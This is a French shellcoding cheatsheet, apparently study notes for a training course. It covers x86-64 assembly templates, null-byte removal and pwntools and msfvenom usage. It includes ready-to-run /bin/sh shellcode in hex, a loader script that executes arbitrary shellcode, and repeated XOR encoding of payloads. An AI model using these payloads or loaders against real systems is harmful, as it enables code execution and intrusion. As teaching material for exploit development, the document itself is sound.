# Shellcoding CHEATSHEET

## <mark style="color:$danger;">📚 Fiche Complète - Shellcoding : Commandes & Automatisations</mark>

***

### <mark style="color:blue;">🔧 OUTILS ET COMMANDES DE BASE</mark>

#### 📖 Consulter les syscalls

```bash
man -s 2 execve          # Manuel du syscall execve
man -s 2 write           # Manuel du syscall write
```

#### 🔨 Compilation et assemblage

```bash
./assembler.sh helloworld.s      # Compiler un fichier .s
nasm -f elf64 file.s             # Assembler manuellement
ld file.o -o file                # Linker manuellement
```

#### 🧪 Test et exécution

```bash
./helloworld                     # Exécuter le binaire
python3 loader.py 'SHELLCODE'    # Charger et exécuter un shellcode
python3 shellcoder.py helloworld # Extraire le shellcode d'un binaire
```

***

### <mark style="color:blue;">🛠️ PWNTOOLS - Commandes essentielles</mark>

#### 📋 Lister les shellcodes disponibles

```bash
pwn shellcraft -l 'amd64.linux'
```

#### 🐚 Générer un shellcode /bin/sh

```bash
pwn shellcraft amd64.linux.sh                    # Afficher le shellcode
pwn shellcraft amd64.linux.sh -r                 # Tester directement
pwn shellcraft amd64.linux.sh -f hex             # Format hexadécimal
```

#### 🔍 Désassembler du shellcode

```bash
pwn disasm 'HEXCODE' -c 'amd64'
```

#### 🏗️ Assembler du code

```bash
pwn asm 'mov rax, 1' -c 'amd64'                  # Assembler une instruction
pwn asm 'xor rax, rax' -c 'amd64'                # Version optimisée
```

#### 🐍 Utilisation Python avec pwntools

```python
from pwn import *

# Configuration
context(os="linux", arch="amd64", log_level="error")

# Générer un shellcode execve
syscall = shellcraft.execve(path='/bin/sh', argv=['/bin/sh'])
shellcode_hex = asm(syscall).hex()
print(shellcode_hex)

# Assembler du code directement
code = asm('xor rax, rax; mov al, 1')
print(code.hex())
```

***

### <mark style="color:blue;">💣 MSFVENOM - Génération de payloads</mark>

#### 📋 Lister les payloads disponibles

```bash
msfvenom -l payloads | grep 'linux/x64'          # Payloads Linux x64
msfvenom -l encoders                             # Encodeurs disponibles
```

#### 🐚 Générer un shellcode /bin/sh

```bash
msfvenom -p 'linux/x64/exec' CMD='sh' \
         -a 'x64' \
         --platform 'linux' \
         -f 'hex'
```

#### 🔐 Encoder un shellcode

```bash
# Encodage simple avec x64/xor
msfvenom -p 'linux/x64/exec' CMD='sh' \
         -a 'x64' \
         --platform 'linux' \
         -f 'hex' \
         -e 'x64/xor'

# Encodage multiple (5 fois)
msfvenom -p 'linux/x64/exec' CMD='sh' \
         -a 'x64' \
         --platform 'linux' \
         -f 'hex' \
         -e 'x64/xor' \
         -i 5
```

#### 🛠️ Encoder un shellcode personnalisé

```bash
# Créer un fichier binaire depuis le hex
python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('SHELLCODE_HEX'))" > shell.bin

# Encoder ce shellcode
msfvenom -p - \
         -a 'x64' \
         --platform 'linux' \
         -f 'hex' \
         -e 'x64/xor' \
         < shell.bin
```

***

### <mark style="color:blue;">🐞 DEBUGGING AVEC GDB</mark>

```bash
gdb -q ./helloworld                              # Lancer GDB en mode quiet

# Dans GDB
(gdb) break _start                               # Breakpoint au début
(gdb) run                                        # Exécuter
(gdb) info registers                             # Voir tous les registres
(gdb) x/s $rsi                                   # Examiner la chaîne dans rsi
(gdb) x/20x $rsp                                 # Examiner 20 octets sur la stack
(gdb) stepi                                      # Exécuter instruction par instruction
(gdb) continue                                   # Continuer l'exécution
```

***

### <mark style="color:blue;">📝 CODE ASSEMBLEUR - Templates</mark>

#### 🌍 Hello World (avec variables - NE PAS UTILISER pour shellcode)

```nasm
global _start

section .data
    message db "Hello HTB Academy!", 0x0a

section .text
_start:
    mov rax, 1              ; syscall write
    mov rdi, 1              ; stdout
    mov rsi, message        ; pointeur vers message
    mov rdx, 18             ; longueur
    syscall
    
    mov rax, 60             ; syscall exit
    xor rdi, rdi            ; code 0
    syscall
```

#### ✅ Hello World (shellcode-friendly - SANS variables)

```nasm
global _start

section .text
_start:
    ; Construire "Hello HTB Academy!" sur la stack
    xor rbx, rbx
    mov bx, 'y!'
    push rbx
    mov rbx, 'B Academ'
    push rbx
    mov rbx, 'Hello HT'
    push rbx
    mov rsi, rsp            ; rsi pointe vers la chaîne
    
    ; syscall write(1, rsi, 18)
    xor rax, rax
    mov al, 1               ; write
    xor rdi, rdi
    mov dil, 1              ; stdout
    xor rdx, rdx
    mov dl, 18              ; longueur
    syscall
    
    ; syscall exit(0)
    xor rax, rax
    add al, 60              ; exit
    xor dil, dil            ; code 0
    syscall
```

#### 🐚 Shellcode /bin/sh (avec NULL bytes)

```nasm
global _start

section .text
_start:
    mov rax, 59             ; execve
    push 0                  ; NULL terminator
    mov rdi, '/bin//sh'
    push rdi
    mov rdi, rsp            ; pathname
    push 0                  ; NULL
    push rdi
    mov rsi, rsp            ; argv
    mov rdx, 0              ; envp
    syscall
```

#### ✅ Shellcode /bin/sh (SANS NULL bytes)

```nasm
global _start

section .text
_start:
    mov al, 59              ; execve (evite les NULL)
    xor rdx, rdx            ; rdx = NULL
    push rdx                ; NULL terminator
    mov rdi, '/bin//sh'
    push rdi
    mov rdi, rsp            ; pathname
    push rdx                ; NULL
    push rdi
    mov rsi, rsp            ; argv
    syscall
```

***

### <mark style="color:blue;">🐍 SCRIPTS PYTHON D'AUTOMATISATION</mark>

#### 📦 shellcoder.py - Extraire le shellcode

```python
#!/usr/bin/env python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section('.text')
print(shellcode.hex())

# Vérifier les NULL bytes
if [i for i in shellcode if i == 0]:
    print(f"{len(shellcode)} bytes - Found NULL byte")
else:
    print(f"{len(shellcode)} bytes - No NULL bytes")
```

**Utilisation :**

```bash
python3 shellcoder.py helloworld
# Output: 4831db66bb792153...0f05
# 61 bytes - No NULL bytes
```

#### 🚀 loader.py - Charger et exécuter un shellcode

```python
#!/usr/bin/env python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(bytes.fromhex(sys.argv[1])).interactive()
```

**Utilisation :**

```bash
python3 loader.py '4831db66bb792153...'
# Exécute le shellcode
```

#### 🔧 Convertir hex en binaire

```python
#!/usr/bin/env python3
import sys

shellcode_hex = sys.argv[1]
sys.stdout.buffer.write(bytes.fromhex(shellcode_hex))
```

**Utilisation :**

```bash
python3 hex_to_bin.py 'SHELLCODE_HEX' > shell.bin
```

***

### <mark style="color:blue;">🎯 TECHNIQUES D'OPTIMISATION</mark>

#### ❌ Éliminer les NULL bytes

| ❌ Mauvais (contient 0x00) | ✅ Bon (sans 0x00)          |
| ------------------------- | -------------------------- |
| `mov rax, 1`              | `xor rax, rax; mov al, 1`  |
| `mov rax, 60`             | `xor rax, rax; add al, 60` |
| `mov rdx, 0`              | `xor rdx, rdx`             |
| `push 0`                  | `xor rbx, rbx; push rbx`   |
| `mov rdi, 1`              | `xor rdi, rdi; mov dil, 1` |

#### 📏 Utiliser les registres partiels

```nasm
; Registre complet (64-bit) → peut créer des NULL bytes
mov rax, 59          ; 48 c7 c0 3b 00 00 00 (7 bytes avec NULL)

; Registre partiel (8-bit) → évite les NULL bytes
mov al, 59           ; b0 3b (2 bytes, pas de NULL)

; Registre partiel (16-bit)
mov ax, 0x2179       ; 66 b8 79 21 (4 bytes)
```

#### 🗂️ Pusher des chaînes sur la stack

```nasm
; ❌ Ne fonctionne pas : push limité à 4 bytes (dword)
push 'Hello HT'      ; ERREUR

; ✅ Solution : utiliser un registre intermédiaire
mov rbx, 'Hello HT'
push rbx

; ✅ Pour plusieurs morceaux
mov rbx, 'y!'
push rbx
mov rbx, 'B Academ'
push rbx
mov rbx, 'Hello HT'
push rbx
mov rsi, rsp         ; rsi pointe maintenant vers la chaîne complète
```

***

### <mark style="color:blue;">📊 STRUCTURE MÉMOIRE - Stack pour execve</mark>

```
Stack Layout pour execve("/bin//sh", ["/bin//sh"], NULL):

0x7fffffffdfe0: │ 0x7fffffffdff0 │ ← rsi (argv[0])
                ├────────────────┤
0x7fffffffdfe8: │ 0x0000000000   │   (argv[1] = NULL)
                ├────────────────┤
0x7fffffffdff0: │ '/bin//sh'     │ ← rdi (pathname)
                ├────────────────┤
0x7fffffffdff8: │ 0x0000000000   │   (NULL terminator)
                └────────────────┘

Vue conceptuelle:
execve(pathname, argv[], envp[])
         │        │       │
         │        │       └─→ rdx = NULL
         │        │
         │        └─→ rsi → [ptr1, NULL]
         │                    │
         │                    └─→ ptr1 → "/bin//sh"
         │
         └─→ rdi → "/bin//sh"
```

***

### ✅ CHECKLIST DES EXIGENCES SHELLCODE

#### Les 3 règles d'or :

1. **❌ Pas de variables dans .data ou .bss**
   * ✅ Utiliser la stack (push/pop)
   * ✅ Déplacer les valeurs immédiates dans les registres
2. **❌ Pas d'adresses mémoire absolues**
   * ✅ Utiliser `call label` (RIP-relative)
   * ✅ Utiliser `rsp` pour les références
3. **❌ Pas de NULL bytes (0x00)**
   * ✅ Utiliser `xor` pour mettre à zéro
   * ✅ Utiliser les registres partiels (al, dil, etc.)
   * ✅ Remplacer `push 0` par `xor rbx, rbx; push rbx`

***

### 🌐 RESSOURCES EN LIGNE

#### 🔍 Bases de données de shellcodes

```
Shell-Storm    : http://shell-storm.org/shellcode/
Exploit-DB     : https://www.exploit-db.com/shellcodes
```

#### 💡 Exemple d'utilisation

```bash
# Chercher un shellcode compact sur Exploit-DB
# Ex: shellcode /bin/sh de 22 bytes
# Utile si espace limité (buffer overflow de 22 bytes max)
```

***

### 🔄 WORKFLOW COMPLET

```bash
# 1. Écrire le code assembleur
nano shellcode.s

# 2. Assembler et linker
./assembler.sh shellcode.s

# 3. Extraire le shellcode
python3 shellcoder.py shellcode

# 4. Vérifier l'absence de NULL bytes
# (déjà fait par shellcoder.py avec la modification)

# 5. Tester le shellcode
python3 loader.py 'SHELLCODE_HEX'

# 6. (Optionnel) Encoder le shellcode
echo 'SHELLCODE_HEX' | xxd -r -p > shell.bin
msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin

# 7. Tester le shellcode encodé
python3 loader.py 'ENCODED_SHELLCODE_HEX'
```

***

### 🎓 EXEMPLES COMPLETS

#### Exemple 1 : Shellcode /bin/sh optimisé (27 bytes)

```nasm
global _start
section .text
_start:
    mov al, 59          ; execve
    xor rdx, rdx        ; env = NULL
    push rdx            ; NULL terminator
    mov rdi, '/bin//sh'
    push rdi
    mov rdi, rsp        ; pathname
    push rdx            ; NULL
    push rdi
    mov rsi, rsp        ; argv
    syscall
```

**Shellcode :**

```
b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
```

**Test :**

```bash
python3 loader.py 'b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'
$ whoami
root
```

#### Exemple 2 : Génération avec msfvenom

```bash
msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'
# Output: 6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05

python3 loader.py '6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05'
$ whoami
root
```

***

### 🎯 RÉSUMÉ DES COMMANDES ESSENTIELLES

```bash
# Génération de shellcode
pwn shellcraft amd64.linux.sh                    # Pwntools
msfvenom -p 'linux/x64/exec' CMD='sh' -f 'hex'   # Msfvenom

# Désassemblage
pwn disasm 'HEXCODE' -c 'amd64'

# Assemblage
pwn asm 'mov rax, 1' -c 'amd64'

# Encodage
msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin

# Test
python3 loader.py 'SHELLCODE_HEX'

# Extraction
python3 shellcoder.py binary_file
```

***
